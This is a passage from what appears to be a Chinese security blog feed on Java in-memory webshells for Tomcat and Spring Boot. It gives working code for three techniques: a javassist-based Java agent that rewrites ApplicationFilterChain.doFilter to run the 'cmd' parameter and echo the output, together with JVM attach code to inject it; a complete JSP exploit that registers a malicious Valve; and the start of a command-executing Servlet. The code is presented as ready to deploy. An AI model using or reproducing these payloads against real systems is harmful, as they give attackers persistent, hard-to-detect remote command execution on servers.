字节码编程在此方法添加一句输出试试</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="comment">//创建一个Class池，也就是容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//获取测试类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;com.javassist.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//获取测试类中的目标方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//利用insertBefore方法在测试类方法里添加一行新的输出</span></span><br><span class="line">        ctMethod.insertBefore(<span class="string">&quot;System.out.println(\&quot;修改成功啦\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//写入</span></span><br><span class="line">        ctClass.writeFile();</span><br><span class="line">        <span class="comment">//加载该类的字节码(必不可少)</span></span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="comment">//测试</span></span><br><span class="line">        <span class="type">Demo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">        demo.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释写的很清楚，不再解释，运行看结果</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/12.png" class><p>修改字节码成功。</p><h3 id="构造恶意Agent"><a href="#构造恶意Agent" class="headerlink" title="构造恶意Agent"></a>构造恶意Agent</h3><p>我们需要修改 ApplicationFilterChain 的 doFilter方法，编写Agent主类，引用木头师傅的代码</p><p>遍历加载的Class，然后对目标Class进行重定义</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写 DefineTransformer.java</p><p>对拦截到的类进行if判断，如果类名是 ApplicationFilterChain 就获取doFilter方法，对其内容进行修改，利用 insertBefore 方法，将恶意代码插入到前面</p><p>首先分析一下有回显的恶意代码</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/13.png" class><p>获取到request和response两个对象，接收cmd参数，使用exec方法命令执行，getInputStream() 方法用于获取命令的标准输出流，然后利用 BufferedReader 类将输出流转换为字符流，最后将数据写入响应里，返回给客户端。</p><p>完整代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Attack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(className.equals(ClassName))&#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ctMethod.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">                        ctClass.detach();</span><br><span class="line">                        <span class="keyword">return</span> bytes;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后编译成jar包</p><h3 id="编写注入类"><a href="#编写注入类" class="headerlink" title="编写注入类"></a>编写注入类</h3><p>利用上文说的启动后加载的方式将Agent马注入到正在运行的JVM中，获取运行中JVM 的pid</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/14.png" class><p>编写代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentCommand</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">target</span> <span class="operator">=</span> VirtualMachine.attach(<span class="string">&quot;98736&quot;</span>);</span><br><span class="line">        target.loadAgent(<span class="string">&quot;D:\\javaweb\\java安全\\java-agentShell\\javaAgentTest\\out\\production\\java-agent.jar&quot;</span>);</span><br><span class="line">        target.detach();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码</p><img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/15.png" class><p>任何路由下都是有回显的命令执行</p><p>不过这里有一个小坑，我们是要将agent的jar包加载到正在运行的springboot中，transform方法利用 javassist 字节码编程修改 doFilter 方法，如果springboot没有导入javassist 的maven项目是无法修改成功的，这里当时困扰了我很久，所以在运行前需要导入 javassist 的包才行。</p><p>本片文章主要认识了什么是java agent以及agent内存马的构造思路，至于如何注入内存马，上几篇文章都是通过编写JSP，上传JSP文件来注入内存马，实际上，JSP文件也相当于一个Servlet，在tomcat中也会编译成class文件，并不算真正意义上的无文件木马，所以通常情况下是通过反序列化来注入内存马</p><p>后续我会继续分析反序列化注入内存马的思路与细节</p><p>参考链接：</p><p><a href="https://www.cnblogs.com/nice0e3/p/14086165.html#0x00-%E5%89%8D%E8%A8%80">https://www.cnblogs.com/nice0e3/p/14086165.html#0x00-%E5%89%8D%E8%A8%80</a></p><p><a href="https://xz.aliyun.com/t/9450#toc-16">https://xz.aliyun.com/t/9450#toc-16</a></p><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/tdvszq#863a8583">https://www.yuque.com/tianxiadamutou/zcfd4v/tdvszq#863a8583</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java内存马连续剧——Valve内存马</title>
      <link href="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-什么是Valve"><a href="#0x01-什么是Valve" class="headerlink" title="0x01 什么是Valve"></a>0x01 什么是Valve</h2><p>我们知道，tomcat是由连接器（Connector）和容器（Container）两部分组成。Connector主要作用是监听并且转换为socket请求，然后再交给Container处理，Container里有四类子容器，分别为Engine，Host，Context，Wrapper，这四种容器层层嵌套，我们需要将消息传递到最底层了Wrapper，也就是Servlet里，该怎么传递？</p><h3 id="tomcat的管道机制"><a href="#tomcat的管道机制" class="headerlink" title="tomcat的管道机制"></a>tomcat的管道机制</h3><p>也称pipeline机制，pipeline就是管道，上面所说的四个容器都有自己的pipeline组件，每个Pipeline组件上至少会设定一个Valve（也就是阀门）我们可以把http请求比作在pipeline（管道）流淌的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。</p><p>Pipeline 中会有一个最基础的 Valve ，为basic Valve，在最末端执行</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/1.png" class><p>我们可以自己尝试写进去一个Valve</p><h2 id="0x02-Valve内存马流程分析"><a href="#0x02-Valve内存马流程分析" class="headerlink" title="0x02 Valve内存马流程分析"></a>0x02 Valve内存马流程分析</h2><p>Valve处理业务逻辑是通过调用重写的invoke方法来实现的，所以自定义一个Valve要继承ValveBase，在invoke方法里添加一些命令执行的代码，一个恶意的Valve就写好了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Valve;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke被调用&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>了解管道机制后，我们知道pipeline里有多个Valve，最后一个为basicValve，有点像之前分析的Filter内存马里的FilterChain，新的Valve会顺序添加到basicValve的前面。关键是自己写的恶意的Valve怎么添加到这个链里。</p><h3 id="将Valve添加到链中"><a href="#将Valve添加到链中" class="headerlink" title="将Valve添加到链中"></a>将Valve添加到链中</h3><p>pipeline提供了addValve方法，可以将新的Valve添加到链中，addValve 方法对应的实现类是 StandardPipeline，我们无法直接获取到，可以通过StandardContext简介获取</p><p>全局搜索Pipeline，有这样一个方法</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class><p>我们跟进getPipeline方法</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/3.png" class><p>其实获取的就是StandardPipeline，所以思路就清晰了，我们可以通过反射来获取 StandardContext 上下文，然后利用StandardContext.getPipeline().addValve() 添加恶意的Valve</p><h3 id="Valve的invoke调用"><a href="#Valve的invoke调用" class="headerlink" title="Valve的invoke调用"></a>Valve的invoke调用</h3><p>我们把断点下在 CoyoteAdapter#service方法中</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/4.png" class><p>这前面是对Request和Respone对象进行一些判断及创建的操作，不用管，直接往后调</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/5.png" class><p>connector就是所说的连接器，调用 getService 方法就是获取与它关联的服务</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/6.png" class><p>然后调用 getContainer().getPipeline()获取容器里的pipeline管道</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/7.png" class><p>也就是 StandardPipeline，调用getFirst 方法获取第一个Valve，跟进</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/8.png" class><p>没有添加任何Valve，就获取基础的Valve，调用它的invoke方法实现业务逻辑</p><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/9.png" class><p>然后继续调用后续的invoke方法。</p><h2 id="0x03-编写exp"><a href="#0x03-编写exp" class="headerlink" title="0x03 编写exp"></a>0x03 编写exp</h2><blockquote><p>写一个恶意的Valve</p><p>通过反射获取StandardContext </p><p>通过StandardContext 获取StandardPipeline</p><p>调用StandardPipeline的addValve方法将Valve添加进去</p></blockquote><p>今儿又知道一个获取 standardContext 的方法，这个代码更短</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">req</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">req.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) req.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure><p>通过 ServletRequest 获取与当前请求相关联的 Servlet 上下文</p><p>然后就是获取StandardPipeline，调用addValve方法了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line">pipeline.addValve(<span class="keyword">new</span> <span class="title class_">evalValve</span>());</span><br></pre></td></tr></table></figure><p>完整的exp：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evalValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;invoke被调用&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">req</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    req.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) req.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line"></span><br><span class="line">    pipeline.addValve(<span class="keyword">new</span> <span class="title class_">evalValve</span>());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><img src="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/10.png" class><p>接下来任何路由都可以执行命令。重启服务器后即可清除内存马。</p><p>相关链接：<a href="https://www.cnblogs.com/54chensongxia/p/13221789.html">https://www.cnblogs.com/54chensongxia/p/13221789.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java内存马连续剧——Servlet内存马</title>
      <link href="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>该分析servlet内存马的注册了，其实注册方式都大差不差，就是通过反射的方式生成web.xml的配置，然后添加到上下文中。</p><h2 id="0x01-创建一个servlet"><a href="#0x01-创建一个servlet" class="headerlink" title="0x01 创建一个servlet"></a>0x01 创建一个servlet</h2><p>servlet是一个java程序，用于处理客户端（通常是Web浏览器）发起的请求并生成响应，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init()进行初始化，destroy()销毁，doGet()方法处理游览器发起的get请求，这里我添加恶意代码用于执行命令。然后再web.xml配置文件中添加路由相关信息。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>Servlet.MyServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/MyServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动服务器，访问配置好的路由，</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/1.png" class><p>这就是一个servlet基本的功能，想要动态注册servlet内存马，就要清楚了解servlet的初始化过程。</p><h2 id="0x02-读取web-xml"><a href="#0x02-读取web-xml" class="headerlink" title="0x02 读取web.xml"></a>0x02 读取web.xml</h2><p>直接将目标定在读取web.xml配置文件的地方，也就是ContextConfig#configureContext方法。这里将断点下在读取servlet的地方进行调试</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class><p>前几个都是系统默认的servlet，</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/3.png" class><p>遍历到我们自定义的servlet，创建一个所对应的wrapper，它是一个用于包装和管理Servlet的容器，一个context可以对应多个wrapper，但是一个wrapper只能封装一个servlet。接着往下调，经过两个没有用的if判断，我们直接跳过</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/4.png" class><p>将servlet的名称添加到wrapper中，遍历params的大小为0，跳过循环</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/5.png" class><p>这里将servlet的全限名添加进去，</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/6.png" class><p>然后将这个wrapper放进context里面，继续往下走</p><img src="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/7.png" class><p>将 web.xml 中定义的 Servlet 映射添加到 Servlet 上下文中，到此我们在web.xml配置里的信息全部读取出来添加到context里了。</p><h2 id="0x03-手写servlet马"><a href="#0x03-手写servlet马" class="headerlink" title="0x03 手写servlet马"></a>0x03 